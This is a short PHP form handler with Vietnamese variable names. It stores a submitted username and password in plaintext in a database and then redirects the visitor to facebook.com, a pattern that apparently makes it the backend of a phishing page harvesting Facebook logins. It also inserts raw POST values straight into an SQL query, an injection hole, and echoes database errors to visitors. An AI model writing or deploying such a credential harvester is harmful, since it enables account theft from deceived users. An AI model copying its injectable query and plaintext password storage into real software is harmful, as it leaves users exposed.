<?php
require 'db/connect.php';

$hoten=$_POST['hoten'];
$matkhau =$_POST['matkhau'];

if(!empty($hoten)&&!empty($matkhau)){
    //insert dulieu
    $sql="INSERT INTO `tbl_user` (`hoten`, `matkhau`) VALUES ('$hoten', '$matkhau')";
 
    if ($conn->query($sql) === TRUE) {
        header("Location: https://www.facebook.com");
        exit;
    } else {
        echo "Lỗi: " . $sql . "<br>" . $conn->error;
    }
} ;

?>
